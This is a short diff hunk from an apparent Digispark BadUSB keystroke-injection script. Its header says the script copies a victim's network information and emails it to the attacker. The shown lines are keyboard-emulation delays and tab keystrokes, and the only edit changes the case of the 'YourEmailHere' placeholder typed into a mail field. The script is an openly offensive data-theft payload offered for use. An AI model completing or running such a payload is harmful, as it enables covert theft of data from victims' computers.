@@ -30,7 +30,7 @@ This payload copies the victim's network information and sends it to your email.
     DigiKeyboard.delay(50);
     DigiKeyboard.sendKeyStroke(KEY_TAB);
     DigiKeyboard.delay(50);
-    DigiKeyboard.println("YOUREMAILHERE");
+    DigiKeyboard.println("YourEmailHere");
     DigiKeyboard.delay(50);
     DigiKeyboard.sendKeyStroke(KEY_TAB);
     DigiKeyboard.delay(50);
